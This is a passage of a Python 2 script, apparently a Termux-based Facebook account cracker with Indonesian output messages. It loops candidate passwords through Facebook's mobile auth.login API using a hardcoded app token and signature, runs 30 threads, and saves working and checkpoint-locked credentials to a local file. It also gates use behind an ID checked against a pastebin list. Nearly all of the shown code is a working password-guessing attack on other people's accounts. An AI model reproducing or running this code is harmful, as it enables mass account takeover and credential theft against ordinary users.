            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass1
                cps = open('save/email.txt', 'a')
                cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass2
                    okb = open('save/email.txt', 'a')
                    okb.write('[Berhasil] ' + c + user + k + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass2
                    cps = open('save/email.txt', 'a')
                    cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass3
                        okb = open('save/email.txt', 'a')
                        okb.write('[Berhasil] ' + c + user + k + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + '\x1b[1;97m ' + pass3
                        cps = open('save/email.txt', 'a')
                        cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass4
                            okb = open('save/email.txt', 'a')
                            okb.write('[Berhasil] ' + c + user + k + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass4
                            cps = open('save/email.txt', 'a')
                            cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m[\x1b[1;92msuccessfull\x1b[1;92m] ' + c + user + k + ' \x1b[1;92m ' + pass5
                                okb = open('save/email.txt', 'a')
                                okb.write('[Berhasil]' + c + user + k + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;97mcheck-point\x1b[1;97m] ' + c + user + k + ' \x1b[1;97m ' + pass5
                                cps.open('save/email.txt', 'a')
                                cps.write('[Cekpoint]' + c + user + k + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;97mOK\x1b[1;97m/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;97m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/email.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;97m BACK \x1b[1;97m]')
    os.system('python2 un.py')

def idcr():
    uuid = requests.get('https://httpbin.org/uuid')
    jsonid = json.loads(uuid.text)
    idjscr = jsonid['uuid']
    os.system('touch /data/data/com.termux/beta.txt')
    reb = open('/data/data/com.termux/beta.txt', 'w')
    reb.write(idjscr)
    reb.close()
    chk()


def chk():
    x = os.listdir('/data/data/com.termux/')
    if 'beta.txt' in x:
        os.system('chmod 777 /data/data/com.termux/beta.txt')
        readid = open('/data/data/com.termux/beta.txt', 'r').read()
        print 'Your ID : ' + str(readid)
        textupload = requests.get('https://pastebin.com/raw/FWb1V8GH').text
        if readid in textupload:
            print "\x1b[1;92mYour ID is Active  .... "
            time.sleep(5)
            os.system('chmod 000 /data/data/com.termux/beta.txt')
            menu()
        else:
            os.system('chmod 000 /data/data/com.termux/beta.txt')
            print "\x1b[31;1mYour ID Isn't Active ....."
            time.sleep(5)
            sys.exit()
    else:
        idcr()


if __name__ == '__main__':
    os.system('clear')
    print logo
    time.sleep(2)
    chk()
